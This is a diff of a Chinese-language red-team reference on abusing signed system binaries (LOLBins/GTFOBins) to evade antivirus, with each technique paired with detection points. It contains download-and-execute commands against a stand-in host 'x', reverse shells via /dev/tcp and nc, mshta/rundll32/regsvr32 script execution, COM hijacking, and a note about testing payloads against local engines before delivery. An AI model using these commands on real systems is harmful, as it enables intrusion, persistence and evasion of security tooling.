@@ -1,66 +1,51 @@
-# LOLBins & GTFOBins — 活体二进制参考
+# LOLBins 与白名单程序滥用（签名为壳，行为为刃）
 
-> 本文件为 `evasion-comprehensive.md` §4 的伴生手册（补齐「Full LOLBins & GTFOBins reference」断链）。
-> 覆盖 Windows LOLBins 与 Linux GTFOBins 的**用途 → 命令 → 检测侧 → 实测判据**。
-> 授权立场见 `refs/README.md`；权威在线库：LOLBAS (lolbas-project.github.io)、GTFOBins (gtfobins.github.io)。
+> 白名单免杀的系统化方法论：签名程序当"干净载体"，恶意意图藏在参数、数据文件、间接
+> 组合里——静态引擎看签名与哈希全绿，行为才是检测面。技术↔检测侧逐类成对。
 
-## 0. 使用原则
+## 分类框架（滥用面四类）
 
-- LOLBin = 系统自带签名二进制被滥用，借「合法签名」降低静态/行为怀疑。
-- 检测侧核心：**合法二进制 + 异常参数/网络外连/异常父进程**的组合，而非二进制本身。
-
----
-
-## 1. Windows LOLBins（Top 10 + 扩展）
-
-| LOLBin | 用途 | 命令模式 | 检测侧对应点 |
+| 类 | 滥用机制 | 代表程序族 | 检测侧配对 |
 |---|---|---|---|
-| `certutil` | 下载/解码 | `certutil -urlcache -split -f http://x/p.exe` | Sysmon 1 命令行 + 网络外连 |
-| `mshta` | HTA/JS 执行 | `mshta http://x/evil.hta` | mshta 外连 + 子进程 |
-| `regsvr32` | COM scriptlet | `regsvr32 /s /n /u /i:http://x/sc.sct scrobj.dll` | regsvr32 网络参数 |
-| `rundll32` | DLL 导出执行 | `rundll32 payload.dll,Entry` | 异常 DLL 加载 |
-| `wmic` | XSL 执行 | `wmic os get /format:"http://x/evil.xsl"` | wmic 网络 format |
-| `msbuild` | 内联 C# 执行 | `msbuild evil.csproj` | msbuild 加载异常项目 |
-| `installutil` | .NET 程序集 | `installutil /logfile= /LogToConsole=false /U p.exe` | installutil 异常参数 |
-| `mavinject` | DLL 注入 | `mavinject $PID /INJECTRUNNING p.dll` | mavinject 注入行为 |
-| `cmstp` | INF 脚本执行 | `cmstp /s /ns evil.inf` | cmstp 加载异常 INF |
-| `wscript/cscript` | WSH 执行 | `wscript //E:vbscript evil.txt` | 脚本引擎异常 |
-| `bitsadmin` | 下载 | `bitsadmin /transfer n http://x/p.exe C:\p.exe` | BITS 下载任务 |
-| `msiexec` | MSI 下载执行 | `msiexec /q /i http://x/p.msi` | msiexec 网络安装 |
-| `regsvr32`（scrobj） | 远程 SCT | `regsvr32 /u /s /i:http://x/s.sct scrobj.dll` | 远程 scriptlet |
-| `msdt` | 诊断工具（历史 CVE） | `msdt.exe /id PCWDiagnostic ...` | 诊断工具异常参数 |
+| ① 间接执行载体 | 签名程序执行传入代码/脚本（解释器型） | mshta/rundll32/regsvr32/wscript/cscript/msxsl/cmake/dnx | 父子进程链异常（office→mshta）；脚本内容审计；命令行参数特征 |
+| ② 下载与外带 | 签名程序替代 curl/wget（流量合法化） | certutil/bitsadmin/mshta http/expand/curl(系统自带)/powershell | 出网进程白名单化基线偏离；URL 参数特征；传输量与业务模型偏离 |
+| ③ 数据编码通道 | 签名程序做 base64/hex 编解码（C2 姿态伪装） | certutil -decode/-encode、powershell编码命令、msbuild 内联任务 | 编码参数组合遥测；出站编码负载统计 |
+| ④ 权限与持久化原语 | 签名程序提供提权/计划任务/服务注册能力 | schtasks/sc/fodhelper/事件订阅/COM 对象劫持（注册表层） | 注册表敏感键写审计；任务注册来源进程；COM 缺项加载监控 |
 
----
+## 代表技术速查（按检出难度升序）
 
-## 2. Linux GTFOBins（代表条目）
+- **mshta 执行远程/内联脚本**：`mshta vbscript:Close(Execute("..."))`——hta 解释器全功能；
+  检测：mshta 无窗口+网络并存。
+- **rundll32 入口定制**：`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"`——JS 宿主；
+  `rundll32 shell32.dll,Control_RunDLL` 藏参数。
+- **regsvr32 scriptlet**：`regsvr32 /i:http://... scrobj.dll`——远程 sct 执行（老而未死：老系统面）。
+- **certutil 双用**：`-urlcache -split -f http://x` 下载 / `-decode` 解码——参数审计主靶。
+- **bitsadmin**：`/transfer /download /remoteurl`——后台智能传输（流量走系统服务=白）。
+- **msbuild 内联任务**：项目文件内嵌 C# Task（`<UsingTask>`+inline）——构建引擎执行代码；
+  检测：msbuild 无解决方案上下文。
+- **installutil**：`/LogFile= /U assembly.dll`——安装器反射执行 [Run] 方法。
+- **wmic 进程创建**：`process call create` + 远程 `/node:`——无 powershell 的横向执行。
+- **cmake/dotnet 工具链解释器**：开发者机器合理进程——工程文件藏执行逻辑。
+- **COM/注册表层**：DLL 缺项劫持（CAccPropServicesClass 等 CLSID 位）+ seh.dll 类——
+  检测：注册表键值基线差分。
 
-| 二进制 | 用途 | 命令模式 | 检测侧 |
-|---|---|---|---|
-| `curl`/`wget` | 下载 | `curl http://x/p.sh | bash` | 管道到 shell |
-| `bash` | 反向 shell | `bash -i >& /dev/tcp/x/443 0>&1` | /dev/tcp 特征 |
-| `nc` | 反向 shell | `nc -e /bin/sh x 443` | nc 外连 |
-| `python` | 反向 shell/提权 | `python -c 'import pty;pty.spawn(...)'` | python 网络 |
-| `perl`/`ruby`/`php` | 反向 shell | 各语言 `-e` 网络代码 | 脚本引擎网络 |
-| `awk` | 命令执行 | `awk 'BEGIN{system("id")}'` | system() 调用 |
-| `find` | 提权执行 | `find . -exec /bin/sh -p \;` | find -exec shell |
-| `vim`/`less`/`man` | 提权 shell 逃逸 | `:!sh` / `!/bin/sh` | 编辑器逃逸 |
-| `tar`/`zip` | 通配符注入 | `tar -cf /tmp/x.tar --checkpoint=1 --checkpoint-action=exec=sh` | 通配符 + exec |
-| `env`/`timeout` | 执行 | `env /bin/sh` / `timeout 1 /bin/sh` | 间接执行 |
+## 组合范式（实战形态）
 
----
+1. **分阶段拆解**：载体（白程序）→ 数据（编码 payload）→ 执行（另一白程序解码运行）——
+   每段单独看都"合法"，组合才恶意——检测靠链式关联（进程树+参数流）。
+2. **持久化嫁接**：计划任务/服务/COM 劫持指向白程序+恶意参数——自启动面全签名。
+3. **宏/脚本的载体替换**：初始执行从 powershell 换 wscript/cscript/mshta——同一 payload
+   换宿主过不同引擎的语料。
 
-## 3. 检测侧总表（回馈 attack-defense）
+## 检测侧总纲（蓝队视角，回馈 attack-defense 用）
 
-| 平台 | 检测点 | 判据 |
-|---|---|---|
-| Windows | LOLBin 命令行参数 + 网络外连 + 异常父进程 | Sysmon 1/3 + 进程树 |
-| Linux | 脚本引擎网络 + 管道到 shell + /dev/tcp | auditd + 网络遥测 |
+- 进程树异常是第一信号（办公软件/邮件客户端派生解释器）；
+- 命令行全量审计（参数组合特征 > 程序名特征——程序名永远合法）；
+- 编码流量与白进程出网基线偏离；
+- 注册表持久化位差分扫描；
+- 组合链关联分析（单事件全绿，序列告警）。
 
-## 4. 实测判据
+## 变体登记
 
-| 判据 | 方法 |
-|---|---|
-| LOLBin 是否被用于执行 | 命令行含下载/执行参数 + 后续子进程/外连 |
-| 是否规避 | 用正常参数基线（如 certutil 仅 decode 不下载）对比 |
-
-*WARNING: 授权红队评估与安全研究专用。*
+- 新签名程序持续入库（随系统更新）；检测侧同步维护"白程序敏感参数"清单；
+- 每个新载体先过本地引擎族矩阵再进交付。
